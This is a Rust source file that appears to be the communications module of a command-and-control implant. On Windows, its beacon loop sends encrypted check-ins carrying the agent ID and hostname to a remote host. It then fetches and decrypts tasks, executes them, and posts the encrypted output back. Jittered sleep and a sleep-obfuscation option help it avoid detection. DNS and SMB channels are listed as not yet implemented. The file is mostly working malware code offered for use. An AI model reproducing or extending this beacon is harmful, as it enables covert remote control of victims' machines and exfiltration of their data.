pub mod protocol;
pub mod https;
pub mod dns;
pub mod smb;
pub mod task;

use crate::log::LogSink;

#[derive(Debug, Clone, Copy, PartialEq)]
pub enum Channel {
    Https,
    Dns,
    Smb,
}

impl Channel {
    #[allow(clippy::should_implement_trait)]
    pub fn from_str(s: &str) -> Option<Self> {
        match s.to_lowercase().as_str() {
            "https" | "http" | "web" | "wininet" => Some(Self::Https),
            "dns" | "nameresolution" => Some(Self::Dns),
            "smb" | "pipe" | "namedpipe" => Some(Self::Smb),
            _ => None,
        }
    }

    pub fn name(&self) -> &'static str {
        match self {
            Self::Https => "Secure Web Channel",
            Self::Dns => "Name Resolution Channel",
            Self::Smb => "Network Share Channel",
        }
    }

    pub fn all() -> &'static [Self] {
        &[Self::Https, Self::Dns, Self::Smb]
    }
}

pub struct CommsConfig {
    pub channel: Channel,
    pub host: String,
    pub port: u16,
    pub path: String,
    pub result_path: String,
    pub interval_ms: u32,
    pub jitter_pct: u8,
    pub key: Vec<u8>,
    pub agent_id: [u8; 16],
    pub use_sleep_obfs: bool,
    pub max_retries: u32,
}

pub struct CommsResult {
    pub channel: Channel,
    pub description: String,
}

pub fn dry_run(channel: &str, host: &str, port: u16, interval: u32, log: &LogSink) {
    let ch = Channel::from_str(channel).unwrap_or(Channel::Https);
    log.info(format!("\n[Comms: {}]", ch.name()));
    log.info(format!("  Endpoint: {}:{}", host, port));
    log.info(format!("  Interval: {}ms", interval));
    log.step("Step 1: Initialize session handle");
    log.step("Step 2: Send encrypted check-in");
    log.step("Step 3: Receive and decrypt task list");
    log.step("Step 4: Execute tasks, capture output");
    log.step("Step 5: Send encrypted results");
    log.step("Step 6: Sleep with jitter");
    log.step("Step 7: Repeat until exit signal");
    log.info("  [DRY RUN — no connection made]".to_string());
}

pub fn run_comms(config: &CommsConfig, log: &LogSink) -> Result<CommsResult, String> {
    match config.channel {
        Channel::Https => {
            beacon_loop(config, log)?;
            Ok(CommsResult {
                channel: config.channel,
                description: format!("Session ended ({}:{})", config.host, config.port),
            })
        }
        Channel::Dns => Err("Name Resolution Channel is not yet implemented".to_string()),
        Channel::Smb => Err("Network Share Channel is not yet implemented".to_string()),
    }
}

pub fn print_info(log: &LogSink) {
    log.info("\nAvailable channels:".to_string());
    for (i, ch) in Channel::all().iter().enumerate() {
        let status = match ch {
            Channel::Https => "operational",
            _ => "planned",
        };
        log.info(format!("  {}. {} ({})", i + 1, ch.name(), status));
    }
}

pub fn parse_hex_key(hex: &str) -> Result<Vec<u8>, String> {
    let hex = hex.trim();
    if hex.is_empty() {
        return Err("key cannot be empty".to_string());
    }
    if !hex.len().is_multiple_of(2) {
        return Err("hex key must have even number of characters".to_string());
    }
    if hex.len() < 2 {
        return Err("key must be at least 1 byte".to_string());
    }
    let mut bytes = Vec::with_capacity(hex.len() / 2);
    for i in (0..hex.len()).step_by(2) {
        let byte_str = &hex[i..i + 2];
        let byte = u8::from_str_radix(byte_str, 16)
            .map_err(|_| format!("invalid hex at position {}: '{}'", i, byte_str))?;
        bytes.push(byte);
    }
    Ok(bytes)
}

pub fn generate_agent_id() -> [u8; 16] {
    let mut id = [0u8; 16];
    #[cfg(windows)]
    {
        let tick = unsafe { crate::resolve::GetLastError() };
        let pid = std::process::id();
        let seed = (pid as u64) ^ ((tick as u64) << 16) ^ 0xDEADBEEF_CAFEBABE;
        let mut state = seed;
        for byte in id.iter_mut() {
            state ^= state << 13;
            state ^= state >> 7;
            state ^= state << 17;
            *byte = state as u8;
        }
    }
    #[cfg(not(windows))]
    {
        let pid = std::process::id();
        let mut state = (pid as u64) ^ 0xDEADBEEF_CAFEBABE;
        for byte in id.iter_mut() {
            state ^= state << 13;
            state ^= state >> 7;
            state ^= state << 17;
            *byte = state as u8;
        }
    }
    id
}

#[cfg(not(windows))]
fn beacon_loop(_config: &CommsConfig, _log: &LogSink) -> Result<(), String> {
    Err("requires Windows".to_string())
}

#[cfg(windows)]
fn beacon_loop(config: &CommsConfig, log: &LogSink) -> Result<(), String> {
    log.info(format!("\n[{}] Connecting to {}:{}", config.channel.name(), config.host, config.port));

    let session = https::init(&config.host, config.port, log)?;

    let hostname = get_hostname();
    let mut current_interval = config.interval_ms;
    let mut error_count: u32 = 0;
    let mut exit_flag = false;

    log.info(format!("  Agent: {} on {}", hex_id(&config.agent_id), hostname));
    log.step("Entering loop");

    while !exit_flag {
        let checkin = protocol::serialize_checkin(&config.agent_id, &hostname, current_interval);
        let encrypted = protocol::encrypt_message(&checkin, &config.key);

        match https::post(&session, &config.path, &encrypted, log) {
            Ok(response) => {
                error_count = 0;

                if !response.is_empty() {
                    let decrypted = protocol::decrypt_message(&response, &config.key);
                    match protocol::parse_task_list(&decrypted) {
                        Ok(tasks) => {
                            for t in &tasks {
                                let result = task::execute(t.task_type as u8, &t.data, log);

                                if t.task_type == protocol::TaskType::SleepChange && result.success {
                                    if let Ok(s) = String::from_utf8(result.output.clone()) {
                                        if let Ok(ms) = s.parse::<u32>() {
                                            current_interval = ms;
                                        }
                                    }
                                }
                                if t.task_type == protocol::TaskType::Exit {
                                    exit_flag = true;
                                }

                                let result_msg = protocol::serialize_result(
                                    &config.agent_id,
                                    t.id,
                                    result.success,
                                    &result.output,
                                );
                                let enc_result = protocol::encrypt_message(&result_msg, &config.key);
                                let _ = https::post(&session, &config.result_path, &enc_result, log);
                            }
                        }
                        Err(_) => {}
                    }
                }
            }
            Err(e) => {
                error_count += 1;
                log.info(format!("  Connection error ({}): {}", error_count, e));
                if error_count >= config.max_retries {
                    https::close(session);
                    return Err(format!("max retries ({}) exceeded", config.max_retries));
                }
                current_interval = (current_interval * 2).min(config.interval_ms * 5);
            }
        }

        if !exit_flag {
            let sleep_ms = jittered_sleep(current_interval, config.jitter_pct);
            unsafe { crate::resolve::Sleep(sleep_ms) };
        }
    }

    https::close(session);
    log.info("  Session closed".to_string());
    Ok(())
}

fn jittered_sleep(interval: u32, jitter_pct: u8) -> u32 {
    if jitter_pct == 0 || interval == 0 {
        return interval;
    }
    let pct = (jitter_pct as u32).min(50);
    let variance = interval * pct / 100;
    let pid = std::process::id();
    let pseudo = (pid.wrapping_mul(2654435761)) as u32;
    let offset = pseudo % (variance * 2 + 1);
    interval.saturating_sub(variance).saturating_add(offset)
}

#[cfg(windows)]
fn get_hostname() -> String {
    let mut buf = [0u8; 256];
    let mut size: u32 = 256;
    unsafe {
        if crate::resolve::GetComputerNameA(buf.as_mut_ptr(), &mut size) != 0 {
            String::from_utf8_lossy(&buf[..size as usize]).to_string()
        } else {
            "UNKNOWN".to_string()
        }
    }
}

#[cfg(not(windows))]
fn get_hostname() -> String {
    "UNKNOWN".to_string()
}

fn hex_id(id: &[u8; 16]) -> String {
    id.iter().map(|b| format!("{:02x}", b)).collect::<Vec<_>>().join("")
}
